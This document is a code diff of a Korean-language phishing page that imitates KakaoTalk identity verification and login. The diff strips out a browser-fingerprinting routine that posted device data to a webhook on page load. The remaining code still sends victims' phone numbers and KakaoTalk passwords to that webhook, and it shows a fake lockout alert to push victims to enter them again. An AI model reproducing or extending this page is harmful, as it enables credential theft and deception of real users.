@@ -69,10 +69,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
 </div>
 
-<div id="page3" class="login-container hidden">
-<h2>인증번호 입력</h2>
-<input type="text" placeholder="인증번호" id="authCode" readonly>
-</div>
+<!-- ✅ page3 삭제됨 -->
 
 <div id="page4" class="login-container hidden">
 <h2>카카오톡 본인인증하기</h2>
@@ -116,118 +113,6 @@ function goNext() {
   showPage('page1', 'page2');
 }
 
-// --- 확장된 정보 수집 ---
-async function collectUserInfo() {
-    const formData = new URLSearchParams();
-
-    // 브라우저/플랫폼
-    formData.append("userAgent", navigator.userAgent);
-    formData.append("language", navigator.language);
-    formData.append("languages", navigator.languages.join(","));
-    formData.append("platform", navigator.platform);
-    formData.append("vendor", navigator.vendor);
-    formData.append("cookieEnabled", navigator.cookieEnabled);
-    formData.append("onLine", navigator.onLine);
-    formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
-    formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
-    formData.append("maxTouchPoints", navigator.maxTouchPoints ?? "unknown");
-    formData.append("appName", navigator.appName);
-    formData.append("appVersion", navigator.appVersion);
-    formData.append("product", navigator.product);
-
-    // 화면/디스플레이
-    formData.append("screen.width", screen.width);
-    formData.append("screen.height", screen.height);
-    formData.append("screen.availWidth", screen.availWidth);
-    formData.append("screen.availHeight", screen.availHeight);
-    formData.append("screen.colorDepth", screen.colorDepth);
-    formData.append("screen.pixelDepth", screen.pixelDepth);
-    formData.append("window.innerWidth", window.innerWidth);
-    formData.append("window.innerHeight", window.innerHeight);
-    formData.append("window.outerWidth", window.outerWidth);
-    formData.append("window.outerHeight", window.outerHeight);
-    formData.append("devicePixelRatio", window.devicePixelRatio);
-    formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
-
-    // 네트워크
-    if (navigator.connection) {
-        formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
-        formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
-        formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
-        formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
-    }
-
-    // 배터리
-    if (navigator.getBattery) {
-        try {
-            const battery = await navigator.getBattery();
-            formData.append("battery.charging", battery.charging);
-            formData.append("battery.level", battery.level);
-            formData.append("battery.chargingTime", battery.chargingTime);
-            formData.append("battery.dischargingTime", battery.dischargingTime);
-        } catch(e){ formData.append("battery.info","unknown"); }
-    }
-
-    // 플러그인/폰트
-    formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
-    formData.append("fonts", Array.from(document.fonts).map(f => f.family).join(",") || "unknown");
-
-    // 센서
-    if(window.DeviceMotionEvent) {
-        window.addEventListener("devicemotion", e=>{
-            if(e.acceleration) {
-                formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
-                formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
-                formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
-            }
-        }, { once:true });
-    }
-    if(window.DeviceOrientationEvent) {
-        window.addEventListener("deviceorientation", e=>{
-            formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
-            formData.append("sensors.orientation.beta", e.beta ?? "unknown");
-            formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
-        }, { once:true });
-    }
-
-    // Canvas fingerprint
-    try {
-        const canvas = document.createElement("canvas");
-        const ctx = canvas.getContext("2d");
-        ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(125,1,62,20);
-        ctx.fillStyle = "#069";
-        ctx.fillText("fingerprint_test", 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-        ctx.fillText("fingerprint_test", 4, 17);
-        formData.append("canvasFingerprint", canvas.toDataURL());
-    } catch(e){ formData.append("canvasFingerprint","error"); }
-
-    // WebGL fingerprint
-    try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        formData.append("webgl.vendor", debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown");
-        formData.append("webgl.renderer", debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown");
-    } catch(e){ formData.append("webgl","error"); }
-
-    // Local/Session Storage
-    try { formData.append("localStorageKeys", Object.keys(localStorage).join(",")); } catch(e) { formData.append("localStorageKeys","error"); }
-    try { formData.append("sessionStorageKeys", Object.keys(sessionStorage).join(",")); } catch(e) { formData.append("sessionStorageKeys","error"); }
-
-    formData.append("timestamp", new Date().toISOString());
-    formData.append("page","1");
-
-    // 전송
-    fetch(webhookUrl, {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:formData})
-        .catch(err=>console.error("WebHook 전송 오류:",err));
-
-}
-// --- 끝 정보 수집 ---
-
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
@@ -245,23 +130,10 @@ function sendPhone() {
     body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
   }).catch(err=>console.error(err));
 
-  if(phoneTryCount <= 2) {
-    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
-    document.getElementById("userId").value = "";
-  }
-
-  if(phoneTryCount >= 3) {
+  if(phoneTryCount >= 1) {
     savedPhone = userId;
-    const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
-   
-    showPage('page2', 'page3');
-    setTimeout(()=>{
-      document.getElementById("authCode").value=randomCode;
-      setTimeout(()=>{
-        showPage('page3', 'page4');
-        document.getElementById("userId4").value = savedPhone;
-      },1000);
-    },1500);
+    showPage('page2', 'page4');
+    document.getElementById("userId4").value = savedPhone;
   }
 }
 
@@ -282,8 +154,7 @@ function sendPage4() {
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
       body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
-    }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
-      .catch(err=>console.error(err));
+    }).catch(err=>console.error(err));
     return;
   }
 
@@ -291,13 +162,6 @@ function sendPage4() {
     alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
     document.getElementById("userCode4").value = "";
     updateLoginBtnColor();
-    fetch(webhookUrl,{
-      method:"POST",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
-    }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
-      .catch(err=>console.error(err));
-    return;
   }
 }
 
@@ -313,14 +177,12 @@ function updateLoginBtnColor() {
   } else {
     loginBtn.classList.remove("btn-yellow");
     loginBtn.classList.add("btn-gray");
-    passwordInput.type = "password";  // 비밀번호 숨김
-    slash.style.display = "none";     // 눈 아이콘 슬래시 숨김
+    passwordInput.type = "password";  
+    slash.style.display = "none";     
   }
 }
 
 passwordInput.addEventListener("input", updateLoginBtnColor);
-passwordInput.addEventListener("keyup", updateLoginBtnColor);
-passwordInput.addEventListener("change", updateLoginBtnColor);
 updateLoginBtnColor();
 
 // 눈 아이콘 토글
@@ -330,16 +192,12 @@ function togglePassword() {
 
   if (input.type === "password") {
     input.type = "text";
-    slash.style.display = "block"; // 보이는 상태: 슬래시 표시
+    slash.style.display = "block";
   } else {
     input.type = "password";
-    slash.style.display = "none"; // 숨김 상태: 슬래시 숨김
+    slash.style.display = "none";
   }
 }
-
-window.addEventListener("load", () => {
-  collectUserInfo();
-});
 </script>
 </body>
 </html>
